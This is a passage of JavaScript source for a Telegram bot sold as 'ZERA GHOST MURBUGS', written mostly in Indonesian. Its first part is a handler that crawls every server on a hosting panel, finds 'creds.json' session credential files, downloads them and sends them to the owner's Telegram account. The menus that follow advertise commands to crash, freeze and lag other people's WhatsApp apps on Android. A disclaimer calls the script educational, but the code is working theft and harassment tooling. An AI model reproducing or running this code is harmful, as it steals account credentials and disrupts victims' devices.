      const listRes = await axios.get(`${base}/api/client/servers/${identifier}/files/list`, { params: { directory: dir }, headers: commonHeadersClient, timeout: 15000 }).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];
      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();
        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(`${base}/api/client/servers/${identifier}/files/list`, { params: { directory: normalized }, headers: commonHeadersClient, timeout: 15000 }).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfName });
              }
            }
          } catch (_) {}
        }
        if (isDirectory(item)) {
          try { const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized); if (more.length) found = found.concat(more); } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
        }
      }
      return found;
    } catch (_) { return []; }
  }
  try {
    const servers = await listAllServers();
    if (!servers.length) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ TIDAK ADA SERVER</h3>`, { loadingText: 'Memuat Hasil' });
    let totalFound = 0;
    for (let srv of servers) {
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;
      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");
          await sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>📁 FOUND CREDS.JSON</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Server</td><td>${name}</td></tr>
  <tr><td>Path</td><td><code>${filePath}</code></td></tr>
</table>
`, { loadingText: 'Memuat Hasil' });
          try {
            const downloadRes = await axios.get(`${base}/api/client/servers/${identifier}/files/download`, { params: { file: filePath }, headers: commonHeadersClient, timeout: 15000 }).catch(() => ({ data: null }));
            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, { responseType: "arraybuffer", timeout: 20000 });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, { source: buffer, filename: `${String(name).replace(/\s+/g, "_")}_creds.json` });
            }
          } catch (e) { console.error(`Gagal download:`, e?.message || e); }
        }
      }
    }
    if (totalFound === 0) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>✅ SCAN SELESAI</h3><hr/><table border="1"><tr><td>Tidak ditemukan creds.json</td></tr></table>`, { loadingText: 'Memuat Hasil' });
    return sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>✅ SCAN SELESAI</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Total Found</td><td>${totalFound}</td></tr>
</table>
`, { loadingText: 'Memuat Hasil' });
  } catch (err) { sendRichTG(ctx.telegram, ctx.chat.id, `<h3>❌ ERROR</h3><hr/><table border="1"><tr><td>Terjadi error saat scan</td></tr></table>`, { loadingText: 'Memuat Error' }); }
});

const slowDelay = () => delay(Math.floor(Math.random() * 300) + 400);

const userFirstStart = new Set();

bot.start(async ctx => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  if (!userFirstStart.has(userId)) {
    userFirstStart.add(userId);
    await delay(800);
  }

  const premiumStatus = isPremiumUser(ctx.from.id) ? "✅ Yes" : "❌ No";
  const cooldownStatus = loadCooldown();
  const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";

  const html = `
<h3>🤖 ZERA GHOST MURBUGS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Developer</td><td>@KeepXi</td></tr>
  <tr><td>Version</td><td>8.0.0</td></tr>
  <tr><td>Platform</td><td>Telegram</td></tr>
  <tr><td>Type</td><td>Bebas Spam Bug</td></tr>
</table>
<hr/>
<h4>📡 SENDER STATUS</h4>
<table border="1">
  <tr><th>Info</th><th>Value</th></tr>
  <tr><td>Sender</td><td>${senderStatus}</td></tr>
</table>
<hr/>
<h4>👤 STATUS LU</h4>
<table border="1">
  <tr><th>Info</th><th>Value</th></tr>
  <tr><td>Premium</td><td>${premiumStatus}</td></tr>
  <tr><td>Cooldown</td><td>${cooldownStatus} detik</td></tr>
</table>
<hr/>
<h4>🛒 BOT ORDER</h4>
<table border="1">
  <tr><td>@ZGABK_BOT - Buy Script Via Bot</td></tr>
</table>
`;

  const keyboard = [
    [
      { text: "XBUGS", callback_data: "/bug", style: "primary" },
      { text: "XCONTROLS", callback_data: "/controls", style: "primary" }
    ],
    [
      { text: "XDEVELOPER", url: "https://t.me/KeepXi", style: "primary" },
    ]
  ];

  return sendRichPhoto(ctx.telegram, chatId, thumbnailUrl, html, {
    loadingText: 'Memuat Menu',
    reply_markup: { inline_keyboard: keyboard }
  });
});

bot.action('/start', async (ctx) => {
  const premiumStatus = isPremiumUser(ctx.from.id) ? "✅ Yes" : "❌ No";
  const cooldownStatus = loadCooldown();
  const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";

  const html = `
<h3>🤖 ZERA GHOST MURBUGS</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Developer</td><td>@KeepXi</td></tr>
  <tr><td>Version</td><td>8.0.0</td></tr>
  <tr><td>Platform</td><td>Telegram</td></tr>
  <tr><td>Type</td><td>Bebas Spam Bug</td></tr>
</table>
<hr/>
<h4>📡 SENDER STATUS</h4>
<table border="1">
  <tr><th>Info</th><th>Value</th></tr>
  <tr><td>Sender</td><td>${senderStatus}</td></tr>
</table>
<hr/>
<h4>👤 STATUS LU</h4>
<table border="1">
  <tr><th>Info</th><th>Value</th></tr>
  <tr><td>Premium</td><td>${premiumStatus}</td></tr>
  <tr><td>Cooldown</td><td>${cooldownStatus} detik</td></tr>
</table>
`;

  try { await ctx.answerCbQuery(); } catch (_) {}

  const keyboard = [
    [
      { text: "XBUGS", callback_data: "/bug", style: "primary" },
      { text: "XCONTROLS", callback_data: "/controls", style: "primary" }
    ],
    [
      { text: "XDEVELOPER", url: "https://t.me/KeepXi", style: "primary" },
    ]
  ];

  const sent = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, html, {
    loadingText: 'Memuat Menu',
    reply_markup: { inline_keyboard: keyboard }
  });
  try { await ctx.deleteMessage(); } catch (_) {}
  return sent;
});

bot.action('/controls', async (ctx) => {
  try { await ctx.answerCbQuery(); } catch (_) {}
  const sent = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>⚙️ ZERA GHOST CONTROLS</h3>
<hr/>
<h4>📡 SETTINGS SENDER</h4>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/addsender</code></td><td>Tambah Sender</td></tr>
  <tr><td><code>/resetsession</code></td><td>Delete Sender</td></tr>
</table>
<hr/>
<h4>⏱ SETTINGS COOLDOWN</h4>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/setcooldown</code></td><td>Settings Cooldown Bugs</td></tr>
</table>
<hr/>
<h4>👤 SETTINGS USER</h4>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/addprem</code></td><td>Add Premium User</td></tr>
  <tr><td><code>/delprem</code></td><td>Delete Premium User</td></tr>
</table>
<hr/>
<h4>👥 SETTINGS GROUP</h4>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/addgroup</code></td><td>Add Premium Group</td></tr>
  <tr><td><code>/delgroup</code></td><td>Delete Premium Group</td></tr>
</table>
`, {
    loadingText: 'Memuat Controls',
    reply_markup: { inline_keyboard: [[{ text: "BACK", callback_data: "/start", style: "success" }]] }
  });
  try { await ctx.deleteMessage(); } catch (_) {}
  return sent;
});

bot.action('/bug', async (ctx) => {
  try { await ctx.answerCbQuery(); } catch (_) {}
  const sent = await sendRichPhoto(ctx.telegram, ctx.chat.id, thumbnailUrl, `
<h3>🐛 ZERA GHOST BUGS</h3>
<hr/>
<h4>📱 ANDROID BUG V1</h4>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/ZeraXFreeze</code></td><td>Freeze Hard Bebas Spam</td></tr>
  <tr><td><code>/ZeraXChat</code></td><td>Delay Chat Hard Bebas Spam</td></tr>
  <tr><td><code>/ZeraXFcs</code></td><td>Crash Andro New Bebas Spam</td></tr>
</table>
<hr/>
<h4>📱 ANDROID BUG V2</h4>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/ZeraXMaklu</code></td><td>Delay Hard New Invisible</td></tr>
  <tr><td><code>/ZeraXBlank</code></td><td>Blank Visible Bebas Spam</td></tr>
  <tr><td><code>/ZeraXCrashNew</code></td><td>Crash Hard New Visible</td></tr>
</table>
`, {
    loadingText: 'Memuat Menu Bug',
    reply_markup: { inline_keyboard: [[{ text: "BACK", callback_data: "/start", style: "success" }]] }
  });
  try { await ctx.deleteMessage(); } catch (_) {}
  return sent;
});

bot.action('/about', async (ctx) => {
  try { await ctx.answerCbQuery(); } catch (_) {}
  const sent = await sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>ℹ️ ABOUT ZERA GHOST</h3>
<hr/>
<table border="1">
  <tr><th>Info</th><th>Detail</th></tr>
  <tr><td>Name</td><td>EXECUTIVE.4.0.4</td></tr>
  <tr><td>Developer</td><td>@KeepXi</td></tr>
  <tr><td>Version</td><td>4.0.4</td></tr>
</table>
<hr/>
<h4>📝 Description</h4>
<table border="1">
  <tr><td>Script ini dibuat untuk tujuan educational & penetration testing only.</td></tr>
</table>
<hr/>
<footer>© 2026 - 2027 | All Rights Reserved</footer>
`, {
    loadingText: 'Memuat Info',
    reply_markup: { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "/start", style: "primary" }]] }
  });
  try { await ctx.deleteMessage(); } catch (_) {}
  return sent;
});

bot.action('/tqto', async (ctx) => {
  try { await ctx.answerCbQuery(); } catch (_) {}
  const sent = await sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🙏 THANKS TO ZERA GHOST</h3>
<hr/>
<table border="1">
  <tr><th>User</th><th>Role</th></tr>
  <tr><td>@KeepXi</td><td>Developer</td></tr>
  <tr><td>My Allah</td><td>My Support</td></tr>
  <tr><td>My Ortu</td><td>My Support</td></tr>
  <tr><td>My Friends</td><td>Best Friends</td></tr>
  <tr><td>My Partner</td><td>Best Partner</td></tr>
</table>
<hr/>
<footer>Thank you for purchasing script · © 2026 - 2027</footer>
`, {
    loadingText: 'Memuat Info',
    reply_markup: { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "/start", style: "primary" }]] }
  });
  try { await ctx.deleteMessage(); } catch (_) {}
  return sent;
});

bot.action('/fun', async (ctx) => {
  try { await ctx.answerCbQuery(); } catch (_) {}
  const sent = await sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🎮 FUN MENU</h3>
<hr/>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/iqc</code></td><td>Ss Chat Iphone</td></tr>
  <tr><td><code>/csessions</code></td><td>Scan Sender With Adp</td></tr>
  <tr><td><code>/tourl</code></td><td>Photos And Videos To Link</td></tr>
  <tr><td><code>/testfunc</code></td><td>Function Test</td></tr>
  <tr><td><code>/cekfunc</code></td><td>Check Error Function</td></tr>
  <tr><td><code>/trackweb</code></td><td>Tracking Website</td></tr>
  <tr><td><code>/statuswebsite</code></td><td>Check Status Website</td></tr>
  <tr><td><code>/cekid</code></td><td>Check Id User</td></tr>
  <tr><td><code>/cekbio</code></td><td>Check Bio WhatsApp</td></tr>
</table>
<hr/>
<footer>© 2026 - 2027 | All Rights Reserved</footer>
`, {
    loadingText: 'Memuat Menu',
    reply_markup: { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "/start", style: "primary" }]] }
  });
  try { await ctx.deleteMessage(); } catch (_) {}
  return sent;
});

bot.action('/murbug', async (ctx) => {
  try { await ctx.answerCbQuery(); } catch (_) {}
  const sent = await sendRichTG(ctx.telegram, ctx.chat.id, `
<h3>🐛 MURBUG MENU</h3>
<hr/>
<h4>Murbug Type</h4>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/Xoverz</code></td><td>DelayBuldozer for Murbug</td></tr>
  <tr><td><code>/ExeForcex</code></td><td>Forclose for Murbug</td></tr>
  <tr><td><code>/ExeBlank</code></td><td>Blank for Murbug</td></tr>
  <tr><td><code>/XForcex</code></td><td>Freeze for Murbug</td></tr>
  <tr><td><code>/Xayo</code></td><td>ComboFc for Murbug</td></tr>
</table>
<hr/>
<h4>Multi Bug Type</h4>
<table border="1">
  <tr><th>Command</th><th>Fungsi</th></tr>
  <tr><td><code>/multibug</code></td><td>Bug lebih dari 1 nomor</td></tr>
</table>
<hr/>
<footer>© 2026 - 2027 | All Rights Reserved</footer>
`, {
    loadingText: 'Memuat Menu Bug',
    reply_markup: { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "/start", style: "primary" }]] }
  });
  try { await ctx.deleteMessage(); } catch (_) {}
  return sent;
});

bot.command('HargaScript', async (ctx) => {
  const text = ctx.message.text.split(' ').slice(1).join(' ');
  if (!text) return sendRichTG(ctx.telegram, ctx.chat.id, `<h3>🪧 FORMAT</h3><hr/><table border="1"><tr><td><code>/HargaScript &lt;teks&gt;</code></td></tr></table>`, { loadingText: 'Memuat Format' });
  const url = `https://api.qrserver.com/v1/create-qr-code/?size=500x500&data=${encodeURIComponent(text)}`;
  await sendRichMessageDraft(ctx.telegram, ctx.chat.id, 'Memuat QR');
  await delay(getDraftDelay());
  await ctx.replyWithPhoto(url, { caption: '✅ QR Code berhasil dibuat' });
});

// ═══════════════════════════════════════════════════════
// AUTO UPDATE NAMA & BIO BOT TELEGRAM
// ═══════════════════════════════════════════════════════
(async () => {
  try {
    const r1 = await axios.post(`https://api.telegram.org/bot${tokenBot}/setMyName`, {
      name: "ZERA GHOST 8.0.0"
    });
    if (r1.data?.ok) console.log(chalk.green("✅ Nama bot Telegram diubah"));

    const r2 = await axios.post(`https://api.telegram.org/bot${tokenBot}/setMyDescription`, {
      description: "ZERA GHOST MURBUG 8.0.0\nDeveloper: @KeepXi\nBot Order: @ZGABK_BOT\n\nBot ini untuk keperluan testing & edukasi."
    });
    if (r2.data?.ok) console.log(chalk.green("✅ Deskripsi bot Telegram diubah"));

    const r3 = await axios.post(`https://api.telegram.org/bot${tokenBot}/setMyShortDescription`, {
      short_description: "Real Developer Script Zera Ghost @KeepXi"
    });
    if (r3.data?.ok) console.log(chalk.green("✅ Short description diubah"));
  } catch (e) {
    console.log(chalk.yellow(`⚠️ Gagal update profil Telegram: ${e.response?.data?.description || e.message}`));
  }
})();

bot.launch()
  .then(() => {
    console.log("✅ Bot ZERA GHOST running");
    console.log("🎬 Animasi loading: AKTIF di SEMUA menu");
    console.log("🔘 Button embed ke rich message (<tg-button-row>): AKTIF");
  })
  .catch((err) => console.error("❌ Bot launch error:", err));

process.on('unhandledRejection', (reason) => { console.error('unhandledRejection:', reason); });
process.on('uncaughtException', (err) => { console.error('uncaughtException:', err); });

})().catch((err) => {
  console.error('\x1b[31m[FATAL] Startup error:\x1b[0m', err);
  process.exit(1);
});
